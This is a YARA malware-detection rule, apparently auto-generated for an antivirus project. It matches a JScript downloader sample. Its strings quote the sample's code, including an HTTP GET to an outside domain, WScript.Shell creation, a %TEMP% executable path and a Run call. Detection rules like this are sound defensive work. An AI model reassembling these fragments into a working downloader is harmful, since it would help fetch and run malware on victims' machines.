rule sig_20160330_a88af264d55ea227e4db8ddf2b402c8d {
  meta:
    description = "datamaliciousorder - file 20160330_a88af264d55ea227e4db8ddf2b402c8d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ca0b8dd5565f9fa5c076abaa2a6aa1fdbdd903d4246cf87a2cde33c2ab7a6f17"

  strings:
    $s1  = "Y0[XK](\"GET\", \"http://aaacollectionsjewelry.com/x9djsa\", false);" fullword ascii
    $s2  = "var D = function OI() {return WScript[L](\"WScript\"+\".Shell\");}(), ZL = 11;" fullword ascii
    $s3  = "function V(D0, CM){Y = Y * 1; return D0 - CM;};" fullword ascii
    $s4  = "if (Y0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function F() {return D[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dK4Jv0dImOhoSAcg.ex\" + \"e\";};" fullword ascii
    $s6  = "function JC(){return PL + \"\";};" fullword ascii
    $s7  = "function C0(U){D[\"Run\"](U, Y, Y);};" fullword ascii
    $s8  = "function C() {return ((X0 == true) && (X0 == C1)) ? 1 : Y;};" fullword ascii
    $s9  = "var R = new this[\"Date\"]();" fullword ascii
    $s10 = "function EK()" fullword ascii
    $s11 = "return V(WV, H);" fullword ascii
    $s12 = "}while (J0);" fullword ascii
    $s13 = "function WU(){return 22;};" fullword ascii
    $s14 = "function Q(J) {var L0 = (1, 2, 3, 4, 5, J); return L0;};" fullword ascii
    $s15 = "function DU(){return L;};" fullword ascii
    $s16 = "var X0 = false;" fullword ascii
    $s17 = "X0 = true; " fullword ascii
    $s18 = "C1 = true; " fullword ascii
    $s19 = "var C1 = false;" fullword ascii
    $s20 = "var WL = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}